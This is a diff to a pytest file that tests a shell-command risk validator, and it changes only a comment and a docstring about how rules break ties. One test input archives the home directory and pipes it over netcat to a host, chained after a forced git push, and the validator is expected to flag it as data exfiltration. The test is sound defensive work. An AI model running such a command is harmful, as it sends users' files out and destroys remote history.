@@ -714,7 +714,8 @@ class TestWhitelistedPrefixDoesNotCoverTheRestOfTheLine:
 class TestWholeCommandRulesInAList:
     """A rule that spans segments fires whatever the other segments match."""
 
-    # Exact lists, not membership: a flipped tie-break drops or reorders a rule.
+    # Exact lists, not membership: a LOW segment rule under a HIGH whole-command rule
+    # pins the append guard, so narrowing it to a tie drops the whole-command rule.
     @pytest.mark.parametrize(
         "command,rules",
         [
@@ -731,7 +732,7 @@ class TestWholeCommandRulesInAList:
         assert result.matched_rules == rules
 
     def test_tie_keeps_the_segment_message_and_names_both_rules(self):
-        """A HIGH segment and a HIGH whole-command rule: the segment speaks, both are logged."""
+        """A HIGH segment tying a distinct HIGH whole-command rule: the segment speaks, both are logged."""
         result = validate_command("git push --force && tar cf - ~ | nc h 1")
         assert result.risk_level == RiskLevel.HIGH, result.risk_level
         assert result.matched_rules == ["git_force_push", "data_exfiltration"]
